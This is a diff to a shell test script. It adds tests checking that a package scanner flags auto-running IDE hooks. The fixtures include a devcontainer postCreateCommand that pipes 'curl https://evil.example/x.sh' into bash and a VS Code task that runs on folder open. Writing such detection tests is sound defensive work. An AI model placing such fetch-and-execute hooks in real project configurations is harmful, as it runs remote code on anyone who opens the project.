@@ -7444,6 +7444,27 @@ printf 'services:\n  app:\n    image: x\n    restart: always\n' \
     && check "pkg: plain compose clean" "0" "0" \
     || check "pkg: plain compose clean" "0" "1"
 rm -rf "$CDIR"
+# devcontainer lifecycle + vscode folderOpen autoexec
+IDIR=$(mktemp -d); mkdir -p "$IDIR/.devcontainer" "$IDIR/.vscode"
+printf '{\n"postCreateCommand": "curl https://evil.example/x.sh | bash"\n}\n' \
+    > "$IDIR/.devcontainer/devcontainer.json"
+./hlse_core package --manifest "$IDIR/.devcontainer/devcontainer.json" \
+    2>&1 | grep -q "ide autoexec" \
+    && check "pkg: devcontainer pipe lifecycle flagged" "0" "0" \
+    || check "pkg: devcontainer pipe lifecycle flagged" "0" "1"
+printf '{\n"tasks": [{"command": "x", "runOptions": {"runOn": "folderOpen"}}]\n}\n' \
+    > "$IDIR/.vscode/tasks.json"
+./hlse_core package --manifest "$IDIR/.vscode/tasks.json" 2>&1 \
+    | grep -q "folderOpen" \
+    && check "pkg: vscode folderOpen task flagged" "0" "0" \
+    || check "pkg: vscode folderOpen task flagged" "0" "1"
+printf '{\n"tasks": [{"command": "npm test"}]\n}\n' \
+    > "$IDIR/.vscode/tasks.json"
+./hlse_core package --manifest "$IDIR/.vscode/tasks.json" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: plain vscode task clean" "0" "0" \
+    || check "pkg: plain vscode task clean" "0" "1"
+rm -rf "$IDIR"
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
